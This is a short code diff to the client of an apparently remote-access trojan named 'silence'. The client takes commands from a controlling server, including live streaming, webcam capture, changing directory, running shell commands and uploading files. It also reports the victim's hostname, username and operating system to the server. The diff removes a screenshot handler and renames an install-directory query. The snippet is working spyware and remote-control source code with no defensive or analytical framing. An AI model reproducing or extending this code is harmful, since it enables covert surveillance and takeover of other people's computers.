@@ -76,14 +76,12 @@ namespace silence {
             launchEvent<void()>([this] { startStreamEvent(); }); // launch in new thread
         else if (event == "kill_stream")
             killStreamEvent();
-        else if (event == "screenshot")
-            screenshotEvent();
         else if (event == "webcamshot")
             webcamShotEvent();
         else if (event == "cd")
             cdEvent(commandObject);
-        else if (event == "install_dir")
-            installDirEvent(commandObject);
+        else if (event == "origin")
+            originEvent(commandObject);
         else if (event == "cmd")
             cmdEvent(commandObject);
         else if (event == "upload")
@@ -98,13 +96,6 @@ namespace silence {
         mSocket->emit("add_client", createObject({{"hostname", SIOSTR(mHostname)},
                                                   {"username", SIOSTR(mUsername)},
                                                   {"os",       SIOSTR(mOS)}}));
-    }
-
-    void Client::screenshotEvent() {
-        impl::Screenshot screen;
-        cv::Mat image{screen.take()};
-
-        response("screenshot", SIOBIN(impl::toBinaryString(image)));
     }
 
     void Client::webcamShotEvent() {
@@ -163,8 +154,8 @@ namespace silence {
         response("cd", SIOBOOL("True"));
     }
 
-    void Client::installDirEvent(const Client::CommandObject &object) {
-        response("install_dir", SIOSTR(mInstallDirectory));
+    void Client::originEvent(const Client::CommandObject &object) {
+        response("origin", SIOSTR(mInstallDirectory));
     }
 
     void Client::cmdEvent(const CommandObject &object) {
